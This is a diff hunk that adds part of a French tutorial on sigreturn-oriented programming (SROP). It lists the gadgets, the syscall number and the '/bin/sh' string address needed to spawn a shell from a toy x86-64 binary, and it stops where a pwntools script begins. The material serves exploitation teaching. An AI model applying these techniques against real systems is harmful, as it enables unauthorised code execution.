@@ -542,6 +542,36 @@ Compilons notre programme nasm :
 nasm -f elf64 srop.asm -o srop.o && ld srop.o -o srop
 ```
 
+Pour notre exploitation nous avons besoin de :
+
+- Un moyen de setup une valeur dans RAX, ici l'adresse de `pop rax` :
+	```py
+	❯ ROPgadget --binary srop | grep "pop rax"
+	0x0000000000401020 : pop rax ; ret
+	```
+- L'ID du syscall rt_sigreturn :
+	```py
+	❯ grep "rt_sigreturn" /usr/include/x86_64-linux-gnu/asm/unistd_64.h
+	#define __NR_rt_sigreturn 15
+	❯ curl https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ | grep "sys_rt_sigreturn"
+	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+					 Dload  Upload   Total   Spent    Left  Speed
+	  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<tr><td>15</td><td>sys_rt_sigreturn</td><td>unsigned long __unused</td>		<td></td><td></td><td></td><td></td><td></td></tr>
+	100 55692    0 55692    0     0   257k      0 --:--:-- --:--:-- --:--:--  258k
+	```
+- Un gadget syscall :
+	```py
+	❯ ROPgadget --binary srop | grep "syscall"
+	0x000000000040101b : syscall
+	```
+- L'adresse de la string `/bin/sh` :
+	```py
+	❯ ROPgadget --binary srop --string /bin/sh
+	Strings information
+	============================================================
+	0x0000000000402000 : /bin/sh
+	```
+
 ```py
 #!/usr/bin/python2
 from pwn import * 
